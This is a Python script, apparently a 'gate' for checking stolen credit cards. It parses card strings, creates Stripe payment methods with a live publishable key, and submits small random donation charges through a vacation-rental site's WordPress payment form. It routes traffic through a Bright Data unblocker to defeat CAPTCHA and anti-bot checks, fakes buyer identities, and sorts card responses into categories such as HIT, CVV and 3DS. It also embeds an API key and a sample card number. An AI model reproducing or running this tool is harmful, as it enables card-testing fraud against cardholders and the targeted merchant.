# gatet.py - Boutique Vacation Rentals Stripe Gateway
# Bright Data Web Unlocker API ကိုသုံးပြီး CAPTCHA အလိုအလျောက်ကျော်
import requests
import json
import time
import random
import uuid
from faker import Faker

fake = Faker("en_US")

# ========== BRIGHT DATA WEB UNLOCKER API ==========
UNLOCKER_API_KEY = "ab44017e-2953-462b-b8bd-ea523fa22eb7"
UNLOCKER_ZONE = "web_unlocker1"
UNLOCKER_URL = "https://api.brightdata.com/request"

# ========== CLASSIFICATION KEYS ==========
success_keys = ["appreciate", "Payment Success", "redirect_to", "thank", "Thanks", "redirectUrl", "succeeded", "confirmation", "Successful!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!", "donation", "complete", "Payment successful"]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "card number is incorrect", "invalid", "Your card number is incorrect"]
declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "declined"]
cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor", "CVC"]
insufficient_keys = ["insufficient", "INSUFFICIENT_FUNDS", "Insufficient Funds", "low funds"]
expired_keys = ["card has expired"]
otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "requires_action", "3d_secure", "authenticate"]

def classify_response(last):
    if not last:
        return "DEAD"
    last_lower = str(last).lower()
    if any(key.lower() in last_lower for key in success_keys):
        return "HIT"
    if any(key.lower() in last_lower for key in otp_keys):
        return "3DS"
    if any(key.lower() in last_lower for key in ccn_keys):
        return "CCN"
    if any(key.lower() in last_lower for key in cvv_keys):
        return "CVV"
    if any(key.lower() in last_lower for key in insufficient_keys):
        return "INSUFFICIENT"
    if any(key.lower() in last_lower for key in expired_keys):
        return "EXPIRED"
    if any(key.lower() in last_lower for key in declined_keys):
        return "DECLINED"
    return "DEAD"

# ========== HELPERS ==========
def gen_random_user_agent():
    chrome_version = random.randint(120, 137)
    agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(agents)

def gen_random_name():
    return fake.first_name(), fake.last_name()

def gen_random_email(first_name, last_name):
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com"]
    return f"{first_name.lower()}{random.randint(1000, 99999)}{random.choice(domains)}"

def gen_random_guid():
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"

def gen_random_phone():
    return f"07{random.randint(10000000, 99999999)}"

def gen_random_amount():
    """Random amount between 0.50 and 1.50"""
    cents = random.randint(50, 150)
    return f"{cents // 100}.{cents % 100:02d}"

# ========== WEB UNLOCKER REQUEST FUNCTION ==========
def unlocker_request(url, payload, headers, timeout=60):
    """Send request through Bright Data Web Unlocker - Auto bypass CAPTCHA & anti-bot"""
    
    full_url = f"{url}?{payload}" if payload else url
    
    try:
        response = requests.post(
            UNLOCKER_URL,
            headers={
                "Authorization": f"Bearer {UNLOCKER_API_KEY}",
                "Content-Type": "application/json"
            },
            json={
                "zone": UNLOCKER_ZONE,
                "url": full_url,
                "format": "raw",
                "method": "POST",
                "post_data": payload,
                "headers": headers
            },
            timeout=timeout
        )
        
        if response.status_code == 200:
            return response.text
        else:
            return f"UNLOCKER_ERROR:{response.status_code}"
            
    except Exception as e:
        return f"UNLOCKER_ERROR:{str(e)}"

# ========== MAIN TELE FUNCTION ==========
def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
    """
    Check credit card via Boutique Vacation Rentals
    Uses Bright Data Web Unlocker to bypass CAPTCHA
    """
    start_time = time.time()
    
    # Parse card
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        elapsed = round(time.time() - start_time, 1)
        return f"ERROR: Invalid format|0.00|{elapsed}"

    n, mm, yy, cvc = parts
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]

    charge_amount = gen_random_amount()
    first_name, last_name = gen_random_name()
    email = gen_random_email(first_name, last_name)
    phone = gen_random_phone()

    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    wallet_config_id = str(uuid.uuid4())

    stripe_key = "pk_live_51ODCnuBD8XiDzI9igICxOfdXhUKRPtd7m4dnxVox4wgwab2pxtZ2uGmt2lZzQPHkWsM7U8QwYPEr1m31qVNTvuBf00ZcLWATAo"

    # ===== STEP 1: Create Payment Method via Web Unlocker =====
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    stripe_payload = (
        f'type=card'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2F39914d4bef%3B+stripe-js-v3%2F39914d4bef%3B+card-element'
        f'&referrer=https%3A%2F%2Fboutiquevacationrentals.cloud'
        f'&time_on_page={random.randint(10000, 90000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
        f'&key={stripe_key}'
    )
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': gen_random_user_agent(),
    }

    # Use Web Unlocker for Stripe API
    try:
        resp_text = unlocker_request(url_stripe, stripe_payload, headers_stripe, timeout=60)
        
        if resp_text.startswith("UNLOCKER_ERROR"):
            elapsed = round(time.time() - start_time, 1)
            return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
            
        resp_json = json.loads(resp_text)
        
        if 'id' not in resp_json:
            elapsed = round(time.time() - start_time, 1)
            return f"STRIPE_ERROR: No payment method|{charge_amount}|{elapsed}"
            
        payment_method_id = resp_json['id']
        
    except json.JSONDecodeError:
        elapsed = round(time.time() - start_time, 1)
        return f"JSON_PARSE_ERROR|{charge_amount}|{elapsed}"
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return f"STRIPE_ERROR: {str(e)[:80]}|{charge_amount}|{elapsed}"

    # ===== STEP 2: Fluent Forms Submit via Web Unlocker =====
    url_wp = "https://boutiquevacationrentals.cloud/wp-admin/admin-ajax.php"
    datetime_now = f"{random.randint(1,28)}/{random.randint(1,12)}/{random.randint(2026,2027)}"
    datetime_future = f"{random.randint(1,28)}/{random.randint(1,12)}/{random.randint(2026,2027)}"
    numeric = random.randint(1000,9999)

    wp_payload = (
        f'data=__fluent_form_embded_post_id%3D2858'
        f'%26_fluentform_3_fluentformnonce%3Dd625de3bed'
        f'%26_wp_http_referer%3D%252Fpayments%252F'
        f'%26names%255Bfirst_name%255D%3D{first_name}'
        f'%26names%255Blast_name%255D%3D{last_name}'
        f'%26email%3D{email}'
        f'%26phone%3D{phone}'
        f'%26input_text%3D'
        f'%26datetime%3D{datetime_now.replace("/", "%252F")}'
        f'%26datetime_1%3D{datetime_future.replace("/", "%252F")}'
        f'%26numeric_field%3D{numeric}'
        f'%26custom-payment-amount%3D{charge_amount}'
        f'%26payment_method%3Dstripe'
        f'%26__stripe_payment_method_id%3D{payment_method_id}'
        f'&action=fluentform_submit'
        f'&form_id=3'
    )

    headers_wp = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://boutiquevacationrentals.cloud',
        'Referer': 'https://boutiquevacationrentals.cloud/payments/',
        'User-Agent': gen_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
    }

    # Use Web Unlocker for WordPress
    try:
        resp_text = unlocker_request(url_wp, wp_payload, headers_wp, timeout=60)
        
        if resp_text.startswith("UNLOCKER_ERROR"):
            elapsed = round(time.time() - start_time, 1)
            return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
            
        resp_json = json.loads(resp_text)
        elapsed = round(time.time() - start_time, 1)

        if resp_json.get('success') == True:
            return f"Thank you for your donation!|{charge_amount}|{elapsed}"

        if 'data' in resp_json and 'errors' in resp_json['data']:
            errors = resp_json['data']['errors']
            error_text = " ".join([msg for msgs in errors.values() for msg in msgs])
            status = classify_response(error_text)

            if status == "HIT":
                return f"Thank you for your donation!|{charge_amount}|{elapsed}"
            elif status == "CCN":
                return f"security code is incorrect|{charge_amount}|{elapsed}"
            elif status == "CVV":
                return f"security code is incorrect|{charge_amount}|{elapsed}"
            elif status == "3DS":
                return f"3D Secure authentication required|{charge_amount}|{elapsed}"
            elif status == "INSUFFICIENT":
                return f"insufficient funds|{charge_amount}|{elapsed}"
            elif status == "EXPIRED":
                return f"card has expired|{charge_amount}|{elapsed}"
            elif status == "DECLINED":
                return f"Your card was declined.|{charge_amount}|{elapsed}"
            else:
                return f"DEAD - {error_text[:80]}|{charge_amount}|{elapsed}"

        message = resp_json.get('message', str(resp_json))
        status = classify_response(message)
        if status == "HIT":
            return f"Thank you for your donation!|{charge_amount}|{elapsed}"
        elif status == "CCN":
            return f"security code is incorrect|{charge_amount}|{elapsed}"
        elif status == "INSUFFICIENT":
            return f"insufficient funds|{charge_amount}|{elapsed}"
        else:
            return f"DEAD - {message[:80]}|{charge_amount}|{elapsed}"

    except json.JSONDecodeError:
        elapsed = round(time.time() - start_time, 1)
        return f"DEAD - JSON Error|{charge_amount}|{elapsed}"
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return f"ERROR - {str(e)[:80]}|{charge_amount}|{elapsed}"


# ========== TEST ==========
if __name__ == "__main__":
    test = "5344560017991222|10|29|900"
    print(Tele(test))
